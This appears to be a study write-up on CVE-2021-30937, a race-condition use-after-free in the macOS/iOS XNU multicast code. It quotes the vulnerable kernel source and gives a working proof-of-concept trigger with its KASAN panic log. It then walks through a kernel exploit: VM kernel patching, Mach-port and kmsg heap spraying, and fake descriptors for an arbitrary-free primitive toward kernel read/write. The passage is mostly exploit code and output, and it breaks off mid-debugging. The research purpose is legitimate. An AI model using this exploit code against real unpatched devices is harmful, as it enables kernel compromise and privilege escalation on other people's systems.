# [Practice] Understanding CVE-2021-30937(multicast_bytecopy) (macOS 12.0.1 / iOS 15)

# Investigating the bug

This is a vulnerability in the `inp_join_group` function of the `bsd/netinet/in_mcast.c` file where a race condition can lead to a heap use-after-free.

The vulnerability occurs under certain conditions; we will examine it with reference to the unpatched [xnu-8019.41.5](https://github.com/apple-oss-distributions/xnu/blob/xnu-8019.41.5) source code.

When `inp_join_group` creates a new membership entry, the function releases the `socket` and `ip_moptions` locks via `socket_unlock(inp->inp_socket, 0);`, which is item **[4]**.

![image.png](pics/image.png)

This locking pattern can lead to the following issue:

1. Before releasing the locks, the function assigns the address of the `imo_mfilters` buffer to the local variable `imf` **[3]**.
    
    ![Screenshot 2025-09-27 at 5.18.06 PM.png](pics/Screenshot_2025-09-27_at_5.18.06_PM.png)
    

1. Once the locks are released **[4]**, another concurrently executing `inp_join_group` call may reallocate `imo_membership` and `imo_mfilters`, causing the `imf` pointer to become invalid.
    
    ![Screenshot 2025-09-27 at 5.18.51 PM.png](pics/Screenshot_2025-09-27_at_5.18.51_PM.png)
    

1. That dangling pointer is then accessed in `in_joingroup` **[5]**, and
    
    ![Screenshot 2025-09-27 at 5.23.53 PM.png](pics/Screenshot_2025-09-27_at_5.23.53_PM.png)
    

1. After the locks are reacquired, it is accessed again in `imf_commit` **[7]**.
   Since the final access performs a write to the referenced object, this bug can be exploited to corrupt the heap.

![image.png](pics/image%201.png)

The vulnerable code is shown below.
Comments include numbered references in the form [n] corresponding to each explanation.

```cpp
/*
 * Join an IPv4 multicast group, possibly with a source.
 *
 * NB: sopt->sopt_val might point to the kernel address space. This means that
 * we were called by the IPv6 stack due to the presence of an IPv6 v4 mapped
 * address. In this scenario, sopt_p points to kernproc and sooptcopyin() will
 * just issue an in-kernel memcpy.
 */
int
inp_join_group(struct inpcb *inp, struct sockopt *sopt)
{

	//...

	/*
	 * Begin state merge transaction at socket layer.
	 */

	if (is_new) {
		if (imo->imo_num_memberships == imo->imo_max_memberships) {
			error = imo_grow(imo, 0);	// [1]
			if (error) {
				goto out_imo_locked;
			}
		}
		/*
		 * Allocate the new slot upfront so we can deal with
		 * grafting the new source filter in same code path
		 * as for join-source on existing membership.
		 */
		idx = imo->imo_num_memberships; // [2]
		imo->imo_membership[idx] = NULL;
		imo->imo_num_memberships++;
		VERIFY(imo->imo_mfilters != NULL);
		imf = &imo->imo_mfilters[idx];  // [3]
		VERIFY(RB_EMPTY(&imf->imf_sources));
	}

    // ...

	/*
	 * Begin state merge transaction at IGMP layer.
	 */
	if (is_new) {
		/*
		 * Unlock socket as we may end up calling ifnet_ioctl() to join (or leave)
		 * the multicast group and we run the risk of a lock ordering issue
		 * if the ifnet thread calls into the socket layer to acquire the pcb list
		 * lock while the input thread delivers multicast packets
		 */
		IMO_ADDREF_LOCKED(imo);
		IMO_UNLOCK(imo);    // [4]
		socket_unlock(inp->inp_socket, 0);  // [4]

		VERIFY(inm == NULL);
		error = in_joingroup(ifp, &gsa->sin_addr, imf, &inm);   // [5]

		socket_lock(inp->inp_socket, 0);
		IMO_REMREF(imo);
		IMO_LOCK(imo);

		VERIFY(inm != NULL || error != 0);
		if (error) {
			goto out_imo_free;
		}
		imo->imo_membership[idx] = inm; /* from in_joingroup() */   // [6]
	} else {
        // ...
	}

out_imf_rollback:
	if (error) {
		imf_rollback(imf);
		if (is_new) {
			imf_purge(imf);
		} else {
			imf_reap(imf);
		}
	} else {
		imf_commit(imf);    // [7]
	}
    // ...
}

/*
 * Leave an IPv4 multicast group on an inpcb, possibly with a source.
 *
 * NB: sopt->sopt_val might point to the kernel address space. Refer to the
 * block comment on top of inp_join_group() for more information.
 */
int
inp_leave_group(struct inpcb *inp, struct sockopt *sopt)
{
	// ...

	IMO_LOCK(imo);
	idx = imo_match_group(imo, ifp, gsa);   // [8]
	if (idx == (size_t)-1) {
		error = EADDRNOTAVAIL;
		goto out_locked;
	}
	inm = imo->imo_membership[idx];
	imf = &imo->imo_mfilters[idx];

    // ...

	if (is_final) {
		/* Remove the gap in the membership array. */
		VERIFY(inm == imo->imo_membership[idx]);
		imo->imo_membership[idx] = NULL;

		/*
		 * See inp_join_group() for why we need to unlock
		 */
		IMO_ADDREF_LOCKED(imo);
		IMO_UNLOCK(imo);    // [9]
		socket_unlock(inp->inp_socket, 0);

		INM_REMREF(inm);

		socket_lock(inp->inp_socket, 0);
		IMO_REMREF(imo);
		IMO_LOCK(imo);

		for (++idx; idx < imo->imo_num_memberships; ++idx) {    // [10]
			imo->imo_membership[idx - 1] = imo->imo_membership[idx];
			imo->imo_mfilters[idx - 1] = imo->imo_mfilters[idx];
		}
		imo->imo_num_memberships--;
	}
    // ...
}
```

# How to trigger

I tested the PoC code on macOS 12.0.1 Monterey running on an Virtual Mac within a VMware/Intel environment.

To verify whether the bug is triggered, a kernel built with KASAN is required.

PoC implementation:

1. Two threads— the main thread and the `thread_func` thread — simultaneously attempt to call `setsockopt` on the same socket file descriptor `fd` with the `IP_ADD_MEMBERSHIP` argument.
2. Before that, one of the racing threads must trigger `imo_grow` **[1]** for the bug to be reproducible. To achieve this, the `imo_mfilters` buffer must be filled to capacity. This is why the code contains a loop like
   `for (int j = 0; j < IP_MIN_MEMBERSHIPS - 1; ++j) { ...`, which appears to fill the buffer.
3. Using `pthread_create`, thread creation and synchronization are repeated 100,000 times.
   This induces a race condition to force the two threads’ `setsockopt` calls to execute almost exactly at the same time inside the kernel.

- poc.m

```cpp
#include <arpa/inet.h>  
#include <pthread.h>  
#include <unistd.h>  
  
volatile int lock_a;  
volatile int lock_b;  
  
int fd;  
struct sockaddr_in saddr;  
  
struct ip_mreq filler_group;  
struct ip_mreq group_a;  
struct ip_mreq group_b;  
  
void* thread_func(void* arg) {  
  lock_a = 1;  
  while (lock_b == 0) {}  
  
  setsockopt(fd, IPPROTO_IP, IP_ADD_MEMBERSHIP, &group_a, sizeof(group_a));  
  
  return NULL;  
}  
  
int main() {  
  int status;  
  pthread_t th;  
  
  saddr.sin_family = AF_INET;  
  
  group_a.imr_multiaddr.s_addr = inet_addr("224.0.0.1");  
  group_b.imr_multiaddr.s_addr = inet_addr("224.0.0.2");  
  
  for (int i = 0; i < 100000; ++i) {  
    fd = socket(AF_INET, SOCK_DGRAM, 0);  
  
    status = bind(fd, (struct sockaddr *) &saddr, sizeof(saddr));  
  
    for (int j = 0; j < IP_MIN_MEMBERSHIPS - 1; ++j) {  
      filler_group.imr_multiaddr.s_addr = htonl(ntohl(inet_addr("224.0.0.3")) + j);  
      status = setsockopt(fd, IPPROTO_IP, IP_ADD_MEMBERSHIP, &filler_group, sizeof(filler_group));  
    }  
  
    pthread_create(&th, NULL, thread_func, NULL);  
  
    while (lock_a == 0) {}  
    lock_b = 1;  
  
    status = setsockopt(fd, IPPROTO_IP, IP_ADD_MEMBERSHIP, &group_b, sizeof(group_b));  
  
    pthread_join(th, NULL);  
  
    close(fd);  
  }  
}  
```

As a result, a crash occurs as shown below.

An attempt to read 8 bytes from heap memory that has already been freed (HEAP_FREED) is detected, and
`inm_merge` indicates that the `imf` pointer refers to freed memory.

![image.png](pics/image%202.png)

```nasm
timestamp:2025-09-27 14:32:14.00 +0900,bug_type:210,os_version:macOS 12.0.1 (21A559)
incident_id:36C464C0-8EFC-4E8C-907B-904068C37459
macOSProcessedStackshotData:bm8gb24gZGlzayBwYW5pYyBzdGFja3Nob3QgZm91bmQgaW4gY29yZWZpbGU=
macOSPanicString:panic(cpu 0 caller 0xffffff8001ce3823): KASan: invalid 8-byte load from 0xffffffa00b4232e0 [HEAP_FREED]
 Shadow             0  1  2  3  4  5  6  7  8  9  a  b  c  d  e  f
 fffff7f401684600: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 
 fffff7f401684610: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 
 fffff7f401684620: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 
 fffff7f401684630: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 
 fffff7f401684640: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 
 fffff7f401684650: fd fd fd fd fd fd fd fd fd fd fd fd[fd]fd fd fd 
 fffff7f401684660: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 
 fffff7f401684670: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 
 fffff7f401684680: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 
 fffff7f401684690: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 
 fffff7f4016846a0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 
 ;

 @kasan-report.c:114
Panicked task 0xffffff88ecbd3298: 1 threads: pid 466: poc
Backtrace (CPU 0), panicked thread: 0xffffff88cb5c6340, Frame : Return Address
0xffffffb050e8e650 : 0xffffff80004384b4 // handle_debugger_trap+0x374
0xffffffb050e8e6a0 : 0xffffff8000843564 // kdp_i386_trap+0x154
0xffffffb050e8e6e0 : 0xffffff800082ce3c // kernel_trap+0x9fc
0xffffffb050e8e770 : 0xffffff800084bba0 // trap_from_kernel+0x26
0xffffffb050e8e790 : 0xffffff8000437d90 // DebuggerTrapWithState+0xd0 
0xffffffb050e8e8c0 : 0xffffff8000438b60 // panic_trap_to_debugger+0x2f0
0xffffffb050e8e930 : 0xffffff8001cc378a // panic+0x54
0xffffffb050e8e9a0 : 0xffffff8001ce3823 // kasan_report_internal_cold_1+0x23
0xffffffb050e8e9b0 : 0xffffff8001cba497 // kasan_report_internal+0x277
0xffffffb050e8ea30 : 0xffffff8001cb9f6d // kasan_crash_report+0x2d
0xffffffb050e8ea60 : 0xffffff8001cba6a5 // __asan_report_load8+0x15
0xffffffb050e8ea70 : 0xffffff800105c96f // inm_merge+0x1abf
0xffffffb050e8ebf0 : 0xffffff800105db55 // in_joingroup+0xcc5
0xffffffb050e8ed70 : 0xffffff800106145d // inp_join_group+0x163d
0xffffffb050e8f0f0 : 0xffffff8001064e40 // inp_setmoptions+0x2a0
0xffffffb050e8f770 : 0xffffff80010cdc71 // ip_ctloutput+0x3f1
0xffffffb050e8f8b0 : 0xffffff800117bfc0 // udp_ctloutput+0x260
0xffffffb050e8f9f0 : 0xffffff80015b45c9 // sosetoptlock+0x629
0xffffffb050e8fd70 : 0xffffff80015e2789 // setsockopt+0x319
0xffffffb050e8fed0 : 0xffffff80018be709 // unix_syscall64+0x3f9
0xffffffb050e8ffa0 : 0xffffff800084c366 // _hndl_unix_scall64+0x16

Process name corresponding to current thread (0xffffff88cb5c6340): poc
Boot args: kdp_match_name=en0 wdt=-1 -v kcsuffix=kasan wlan.skywalk.enable=0 dk=0 tlbto_us=0 vti=9 slide=0

Mac OS version:
21A559

Kernel version:
Darwin Kernel Version 21.1.0: Wed Oct 13 17:25:20 PDT 2021; root:xnu_kasan-8019.41.5~1\/KASAN_X86_64
Kernel UUID: 2DF7E4D6-1231-35FC-ABB9-0D3858C30DD3
KernelCache slide: 0x0000000000000000
KernelCache base:  0xffffff8000200000
Kernel slide:      0x0000000000010000
Kernel text base:  0xffffff8000210000
__HIB  text base: 0xffffff8000100000
System model name: VMware20,1 (NT951XGK-K04\/C)
System shutdown begun: NO
Panic diags file available: YES (0x0)
Hibernation exit count: 0

System uptime in nanoseconds: 193563530907
Last Sleep:           absolute           base_tsc          base_nano
  Uptime  : 0x0000002d114e792c
  Sleep   : 0x0000000000000000 0x0000000000000000 0x0000000000000000
  Wake    : 0x0000000000000000 0x00000002acf3803a 0x0000000000000000
Zone info:
Foreign   : 0xffffff8006b13000 - 0xffffff8006b23000
Native    : 0xffffff800c54a000 - 0xffffffa00c54a000
Readonly  : 0 - 0
Metadata  : 0xffffffeee4e65000 - 0xffffffef04ec0000
Bitmaps   : 0xffffffef04ec0000 - 0xffffffef066c0000
last started kext at 1622081635: >usb.!UHub   1.2 (addr 0xffffff8004e07000, size 172032)
loaded kexts:
|SCSITaskUserClient   452.30.4
@filesystems.apfs   1933.41.2
>!AAHCIPort   351
>!AVmxnet3Ethernet   1.0.10
>!AFileSystemDriver   3.0.1
@filesystems.tmpfs   1
@filesystems.lifs   1
@filesystems.hfs.kext   582.40.4
@BootCache   40
@!AFSCompression.!AFSCompressionTypeZlib   1.0.0
@!AFSCompression.!AFSCompressionTypeDataless   1.0.0d1
@private.KextAudit   1.0
>!AHPET   1.8
>!AACPIButtons   6.1
>!ARTC   2.0.1
>!ASMBIOS   2.1
>!AAPIC   1.7
@!ASystemPolicy   2.0.0
@nke.applicationfirewall   402
|IOKitRegistryCompatibility   1
|EndpointSecurity   1
@Dont_Steal_Mac_OS_X   7.0.0
@kec.!AEncryptedArchive   1
>usb.!UHub   1.2
>usb.IOUSBHostHIDDevice   1.2
>usb.cdc   5.0.0
>usb.networking   5.0.0
>usb.!UHostCompositeDevice   1.2
|IOSCSIMultimediaCommandsDevice   452.30.4
|IOBD!S!F   1.8
|IODVD!S!F   1.8
|IOCD!S!F   1.8
>!AXsanScheme   3
|IOAHCISerialATAPI   268
|IOAHCIBlock!S   333
>usb.!UXHCIPCI   1.2
>usb.!UXHCI   1.2
>usb.!UEHCIPCI   1.2
>usb.!UUHCIPCI   1.2
>usb.!UUHCI   1.2
>usb.!UEHCI   1.2
|IOAHCI!F   295
>!ABSDKextStarter   3
|IOSurface   302.9
@filesystems.hfs.encodings.kext   1
>usb.!UHostPacketFilter   1.0
|IOUSB!F   900.4.2
|IOHID!F   2.0.0
>!AEFINVRAM   2.1
>!AEFIRuntime   2.1
|IOTimeSync!F   1000.11
|IONetworking!F   3.4
>DiskImages   493.0.0
|IO!B!F   9.0.0
|IOReport!F   47
$quarantine   4
$sandbox   300.0
@kext.!AMatch   1.0.0d1
|CoreAnalytics!F   1
>!ASSE   1.0
>!AKeyStore   2
>!UTDM   532.40.7
|IOUSBMass!SDriver   209.40.6
|IOSCSIBlockCommandsDevice   452.30.4
|IO!S!F   2.1
|IOSCSIArchitectureModel!F   452.30.4
>!AMobileFileIntegrity   1.0.5
$!AImage4   4.1.0
@kext.CoreTrust   1
>!AFDEKeyStore   28.30
>!AEffaceable!S   1.0
>!ACredentialManager   1.0
>KernelRelayHost   1
|IOUSBHost!F   1.2
>!UHostMergeProperties   1.2
>usb.!UCommon   1.0
>!ABusPower!C   1.0
>!ASEPManager   1.0.1
>IOSlaveProcessor   1
>!AACPIPlatform   6.1
>!ASMC   3.1.9
|IOPCI!F   2.9
|IOACPI!F   1.4
>watchdog   1
@kec.pthread   1
@kec.Libm   1
@kec.corecrypto   12.0

```

# How to setup Kernel Debugging Environment on Apple Silicon using VMApple

[https://github.com/JJTech0130/super-tart](https://github.com/JJTech0130/super-tart)

```c
- Create GuestOS VM
1. Disable SIP
2. Set `amfi_get_out_of_my_way=1` in `boot-args` using nvram
3. git clone <super-tart.git repo link>
4. cd super-tart
5. ./scripts/run-unsigned.sh
6. .build/debug/tart create
7. .build/debug/tart run <ID>

- Connect debugger from host
(lldb) gdb-remote localhost:8000
(lldb) file <KDK kernel file>
```

![image.png](pics/image%203.png)

# Exploit (macOS 12.0.1 VMAPPLE)

## **⚠️ Notes**

To make the multicast_byte exploit work on VMApple, kernel patching is required.
In iOS 15, the `KHEAP_DEFAULT` and `KHEAP_KEXT` kernel allocation submaps are shared,
but for some reason they are isolated in VMApple.

The functions that need to be patched are `IOMallocZero_external` and `IOMalloc_external`,
and they must be modified so that allocations use the `KHEAP_DEFAULT` type instead of `KHEAP_KEXT`.

![Screenshot 2025-11-24 at 7.18.03 AM.png](pics/Screenshot_2025-11-24_at_7.18.03_AM.png)

Also, since the kernel heap address is hard-coded, profiling may be required.

You can load [KextRW](https://github.com/alfiecg24/KextRW) in VMApple environment,
and enable `ENABLE_HELPER` and `ENABLE_PROFILLING` in **ENABLE_HELPER.h** file to perform profiling.

```c
seo@seos-Mac ~ % ./exp
[!] Try setting macro KHEAP_DATA_MAPPABLE_LOC to 0xfffffe228cb24000
[!] Try setting macro KHEAP_DEFAULT_MAPPABLE_LOC to 0xfffffe228175c000
[!] After setting macro, rerun with disable ENABLE_HELPER

^C
```

For detailed instructions on kernel patching and loading 3rd-party kexts in VMApple, please refer to the link below.

[https://gist.github.com/steven-michaud/fda019a4ae2df3a9295409053a53a65c](https://gist.github.com/steven-michaud/fda019a4ae2df3a9295409053a53a65c)

## Description

As you can see in the `exploit_get_krw_and_kernel_base` function,
the main exploit logic is composed of 4 functions.

1. `exploitation_init`
2. `get_arb_free_holder`
3. `exploitation_get_krw_with_arb_free`
4. `exploitation_cleanup`

## 1. `exploitation_init`

The first function called is `IOGPU_get_command_queue_extra_refills_needed`,
which is required later when freeing ports sprayed via IOGPU using the `KHEAP_DEFAULT` type.
It isn’t important at this stage, so we’ll skip it for now.

```c
int exploitation_init(void)
{
    // different by device, retrieve it first and fail if unsuccessful
    extra_frees_for_device = IOGPU_get_command_queue_extra_refills_needed();
    if (extra_frees_for_device == -1)
    {
        printf("Exiting early, provide correct number 1-5 in the code for this device to proceed\n");
        return 1;
    }
    ...
    
    
int IOGPU_get_command_queue_extra_refills_needed(void)
{
    struct utsname u;
    uname(&u);
    
    // iPhone 7
    // iPhone 11
    // iPhone 12
    // iPhone 13
    if (
       strstr(u.machine, "iPhone9,")
    || strstr(u.machine, "iPhone12,")
    || strstr(u.machine, "iPhone13,")
    || strstr(u.machine, "iPhone14,")
    )
    {
        return 1;
    }
    // iPhone 8, X
    // iPhone XS, XR
    else if (
       strstr(u.machine, "iPhone10,")
    || strstr(u.machine, "iPhone11,")
    )
    {
        return 3;
    }
    
    printf("IOGPU_get_command_queue_extra_refills_needed(): Unknown device %s! May panic in generic part until correct number 1-5 is provided for this device!\n", u.machine);
    
    return -1;
}
```

We create the `kheap_data_ports` ports, which will be used to construct kernel messages,
the `contained_ports` and `ool_ports` for OOL ports,
and the `kheap_data_spray_buf`, which will serve as the data region written during spraying.

We will perform the spray `PORTS_COUNT`, which is 0x2A00 times.

```c
    ...
    kheap_data_ports = malloc(PORTS_COUNT * sizeof(mach_port_t));
    kheap_default_ports = malloc(PORTS_COUNT * sizeof(mach_port_t));
    mach_port_t *contained_ports = malloc(PORTS_COUNT * sizeof(mach_port_t));
    mach_port_t *ool_ports = malloc(0x4000);
    uint8_t *kheap_data_spray_buf = malloc(0x4000);
    memset(kheap_data_ports, 0, PORTS_COUNT * sizeof(mach_port_t));
    memset(kheap_default_ports, 0, PORTS_COUNT * sizeof(mach_port_t));
    memset(contained_ports, 0, PORTS_COUNT * sizeof(mach_port_t));
    memset(ool_ports, 0, 0x4000);
    memset(kheap_data_spray_buf, 0, 0x4000);
    ...
    
```

The `kheap_data_spray_buf`, which serves as the data region written during spraying, contains a fake descriptor for the purpose of performing a free primitive.

Later, if `msgh_bits` includes `MACH_MSGH_BITS_COMPLEX` (0x80000000),
the message object’s destruction will treat the ‘descriptors’ at the beginning of the message buffer as kernel addresses and free them.

```c
    ...
    // fake descriptor for free primitive
    *(uint32_t *)(kheap_data_spray_buf + sizeof(mach_msg_header_t)) = 1;
    *(uint64_t *)(kheap_data_spray_buf + sizeof(mach_msg_header_t) + sizeof(uint32_t)) = KHEAP_DEFAULT_MAPPABLE_LOC; // free primitive target
    *(uint64_t *)(kheap_data_spray_buf + sizeof(mach_msg_header_t) + sizeof(uint32_t) + sizeof(uint64_t)) = 0x000007F802110000; // disposition, size, etc
    // align a pointer here so that when the kmsg trailer size is corrupted, this pointer
    // will after that be followed and a second bytecopy performed where it points (kmsg message bits)
    *(uint64_t *)(kheap_data_spray_buf + 0x3F64) = BYTECOPY_SECOND_TARGET;
```

The heap spray now begins in earnest.

A new Mach port is created using `port_new`.
Using this port, the functions `spray_default_kalloc_ool_ports` and `spray_data_kalloc_kmsg_single` are invoked, which will allocate kernel memory in chunks equal to the kernel page size (0x4000).

Here, `spray_default_kalloc_ool_ports` performs the spray using the **KHEAP_DEFAULT** type,
while `spray_data_kalloc_kmsg_single` uses the **KHEAP_DATA_BUFFERS** type.

We will now examine how `port_new`, `spray_default_kalloc_ool_ports`, and `spray_data_kalloc_kmsg_single` work, and also look into the relevant portions of XNU source code.

```c
#define KMSG_SIZE 0x3F80 // the low 0x80 byte of this size will be copied to corrupt the message bits (setting 0x80000000, MACH_MSGH_BITS_COMPLEX)
    ...
    // spray large sprays to map  KHEAP_DATA_MAPPABLE_LOC and KHEAP_DEFAULT_MAPPABLE_LOC
    for (int i = 0; i < PORTS_COUNT; ++i)
    {
        // KHEAP_DEFAULT
        *ool_ports = port_new();
        contained_ports[i] = *ool_ports;
        mach_port_t *pp = spray_default_kalloc_ool_ports(0x4000, 1, ool_ports);
        kheap_default_ports[i] = pp[0];
        free(pp);
        
        // KHEAP_DATA_BUFFERS
        kheap_data_ports[i] = spray_data_kalloc_kmsg_single(kheap_data_spray_buf, KMSG_SIZE);
    }
```

## 1-1. `port_new()`

First, let’s take a look at the `port_new` function.

It calls `mach_port_construct` with the `MPO_INSERT_SEND_RIGHT` flag and
`mach_task_self()`, which represents the send-right name for the current task’s kernel port.

```c
mach_port_t port_new(void)
{
    mach_port_options_t options = { .flags = MPO_INSERT_SEND_RIGHT };
    mach_port_t port;
    
    mach_port_construct(mach_task_self(), &options, 0, &port);
    
    return port;
}

typedef struct mach_port_options {
	uint32_t                flags;
	mach_port_limits_t      mpl;            /* Message queue limit for port */
	union {
		uint64_t                   reserved[2];           /* Reserved */
		mach_port_name_t           work_interval_port;    /* Work interval port */
		mach_service_port_info_t   service_port_info;     /* Service port (MPO_SERVICE_PORT) */
		mach_port_name_t           service_port_name;     /* Service port (MPO_CONNECTION_PORT) */
	};
}mach_port_options_t;
```

### `mach_port_construct`

Looking into `mach_port_construct` function (osfmk/ipc/mach_port.c:2413),
internally, `IP_INIT_MAKE_SEND_RIGHT` is set in `init_flags`, granting send right.

The `init_flags` value with `IP_INIT_MAKE_SEND_RIGHT` is passed as `flags` argument when calling `ipc_port_alloc`, which creates a new Mach port.
In other words, this generates a new Mach port that can acquire not only receive right but also send right.

```c
kern_return_t
mach_port_construct(
	ipc_space_t             space,
	mach_port_options_t     *options,
	uint64_t                context,
	mach_port_name_t        *name)
{
	kern_return_t           kr;
	ipc_port_t              port;
	ipc_port_init_flags_t   init_flags = IPC_PORT_INIT_MESSAGE_QUEUE;
	void *port_splabel = NULL;
	bool filter_msgs = FALSE;
	struct mach_service_port_info sp_info = {};
	size_t sp_name_length = 0;
	user_addr_t service_port_info = 0;

	//...
	if (options->flags & MPO_INSERT_SEND_RIGHT) {
		init_flags |= IPC_PORT_INIT_MAKE_SEND_RIGHT;
	}

	//...
	/* Allocate a new port in the IPC space */
	kr = ipc_port_alloc(space, init_flags, name, &port);
	if (kr != KERN_SUCCESS) {
		if (port_splabel != NULL) {
			ipc_service_port_label_dealloc(port_splabel,
			    (options->flags & MPO_SERVICE_PORT));
		}
		return kr;
	}

	/* Port locked and active */
	if (port_splabel != NULL) {
		port->ip_service_port = (bool)(options->flags & MPO_SERVICE_PORT);
		port->ip_splabel = port_splabel;
	}

	//...
		port->ip_context = context;
		if (options->flags & MPO_SERVICE_PORT) {
			ipc_service_port_label_set_attr(port_splabel, *name, 0);
		}
	//...

	/* Unlock port */
	ip_mq_unlock(port);

	//...
	return KERN_SUCCESS;

cleanup:
	/* Attempt to destroy port. If its already destroyed by some other thread, we're done */
	(void) mach_port_destruct(space, *name,
	    (options->flags & MPO_INSERT_SEND_RIGHT) ? -1 : 0, context);
	return kr;
}
```

## 1-2. `spray_default_kalloc_ool_ports(0x4000, 1, ool_ports)`

This is code that sprays OOL ports using **KHEAP_DEFAULT** type.
It essentially calls `spray_default_kalloc_ool_ports_with_data_kalloc_size(0x4000, 1, ool_ports, 0x4000)`,
where the message to be sent is constructed via `mach_msg_send` function.

Looking at `msgh_remote_port` field, which specifies port name to which message will be sent,
it is set to the port created through `mach_port_construct` with `MPO_INSERT_SEND_RIGHT` option.

A brief overview of message configuration,

- `msg->hdr.msgh_bits` – Set to `MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0)` to grant send rights to recipient.
  Since the message body may include additional port rights or **out-of-line memory regions**, the `MACH_MSGH_BITS_COMPLEX` flag is also specified.
- `msg->desc.type` – Set to `MACH_MSG_OOL_PORTS_DESCRIPTOR`, which is the descriptor for sending OOL port array in the message.


```c
mach_port_t *spray_default_kalloc_ool_ports(unsigned int size, unsigned int count, mach_port_t *ool_ports)
{
    return spray_default_kalloc_ool_ports_with_data_kalloc_size(size, count, ool_ports, 0x4000);
}

mach_port_t *spray_default_kalloc_ool_ports_with_data_kalloc_size(unsigned int size, unsigned int count, mach_port_t *ool_ports, unsigned int data_kalloc_size)
{
    struct default_msg
    {
        mach_msg_header_t hdr;
        mach_msg_body_t body;
        mach_msg_ool_ports_descriptor_t desc;
    };
    
    mach_port_t *ports = calloc(sizeof(mach_port_t), count);
    mach_port_options_t options = { .flags = MPO_INSERT_SEND_RIGHT };
    struct default_msg *msg = (struct default_msg *)calloc(1, 0x100);
    
    msg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->hdr.msgh_bits  |= MACH_MSGH_BITS_COMPLEX;
    msg->hdr.msgh_size = data_kalloc_size;
    msg->body.msgh_descriptor_count = 1;
    
    msg->desc.deallocate = 0;
    msg->desc.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    msg->desc.copy = MACH_MSG_VIRTUAL_COPY;
    msg->desc.disposition = MACH_MSG_TYPE_COPY_SEND;
    msg->desc.count = size/8;
    msg->desc.address = (void *)ool_ports;
    
    for (unsigned int i = 0; i < count; ++i)
    {
        mach_port_construct(mach_task_self(), &options, 0, &ports[i]);
    }
    
    for (unsigned int i = 0; i < count; ++i)
    {
        msg->hdr.msgh_remote_port = ports[i];
        kern_return_t kr = mach_msg_send((mach_msg_header_t *)msg);
        if (kr) {
            *(int *)1 = 0;
        }
    }
    
    free(msg);

    return ports;
}
```

### `mach_msg_send`

`mach_msg_send` function internally calls `mach_msg_overwrite_trap`. ([osfmk/ipc/mach_msg.c#L319](https://github.com/apple-oss-distributions/xnu/blob/xnu-8019.41.5/osfmk/ipc/mach_msg.c#L319))

Since the message being sent includes `MACH_MSG_TYPE_MAKE_SEND`,
starting from the `if (option & MACH_SEND_MSG) {` code, following functions are called in order.

1. `ipc_kmsg_get_from_user` – allocates kernel message buffer and copies the user message into it.
2. `ipc_kmsg_copyin_from_user` – copy-ins port rights and OOL memory in the message.
3. `ipc_kmsg_send` – sends the message, holding a reference to destination port in `msgh_remote_port` field.

```c
mach_msg_return_t
mach_msg_overwrite_trap(
	struct mach_msg_overwrite_trap_args *args)
{
	mach_vm_address_t       msg_addr = args->msg;
	mach_msg_option_t       option = args->option;
	mach_msg_size_t         send_size = args->send_size;
	mach_msg_size_t         rcv_size = args->rcv_size;
	mach_port_name_t        rcv_name = args->rcv_name;
	mach_msg_timeout_t      msg_timeout = args->timeout;
	mach_msg_priority_t     priority = args->priority;
	mach_vm_address_t       rcv_msg_addr = args->rcv_msg;
	__unused mach_port_seqno_t temp_seqno = 0;

	mach_msg_return_t  mr = MACH_MSG_SUCCESS;
	vm_map_t map = current_map();

	/*
	 * Only accept options allowed by the user.  Extract user-only options up
	 * front, as they are not included in MACH_MSG_OPTION_USER.
	 */
	bool filter_nonfatal = (option & MACH_SEND_FILTER_NONFATAL);

	option &= MACH_MSG_OPTION_USER;

	if (option & MACH_SEND_MSG) {
		ipc_space_t space = current_space();
		ipc_kmsg_t kmsg;

		mr = ipc_kmsg_get_from_user(msg_addr, send_size, &kmsg);

		if (mr != MACH_MSG_SUCCESS) {
			return mr;
		}

		mr = ipc_kmsg_copyin_from_user(kmsg, space, map, priority, &option,
		    filter_nonfatal);

		if (mr != MACH_MSG_SUCCESS) {
			ipc_kmsg_free(kmsg);
			goto end;
		}

		mr = ipc_kmsg_send(kmsg, option, msg_timeout);

		if (mr != MACH_MSG_SUCCESS) {
			//...
			goto end;
		}
	}
	//...

end:
	ipc_port_thread_group_unblocked();
	return mr;
}
```

## 1-3. `spray_data_kalloc_kmsg_single(kheap_data_spray_buf, KMSG_SIZE)`

This is the code that sprays kmsgs using **KHEAP_DATA_BUFFERS** type.
Compared to OOL port spray, there are relatively fewer message configuration settings when constructing the message to be sent via `mach_msg_send`.

```c
mach_port_t spray_data_kalloc_kmsg_single(uint8_t *data, unsigned int size)
{
    mach_port_t port = MACH_PORT_NULL;
    mach_port_options_t options = { .flags = MPO_INSERT_SEND_RIGHT };
    mach_msg_header_t *msg = (mach_msg_header_t *)data;
    
    memset(msg, 0, sizeof(mach_msg_header_t));
    msg->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->msgh_size = size;
    
    mach_port_construct(mach_task_self(), &options, 0, &port);

    msg->msgh_remote_port = port;
    mach_msg_send(msg);
    
    return port;
}
```

## 1-4. Examining sprayed data in kernel

### Discovering the port descriptor array address during OOL Port Spray (KHEAP_DEFAULT)

When executing `spray_default_kalloc_ool_ports` function once,
we can see that kernel heap allocation occurs through several functions,
ultimately in `ipc_kmsg_copyin_ool_ports_descriptor`, as shown below.

```c
(lldb) bt
...
            frame #6: 0xfffffe00287e8974 kernel.release.vmapple`kalloc_ext(kheap=<unavailable>, req_size=16384, flags=<unavailable>, site=<unavailable>) at kalloc.c:1730:9 [opt] //called from FFFFFE00072122B4 (no slide) 
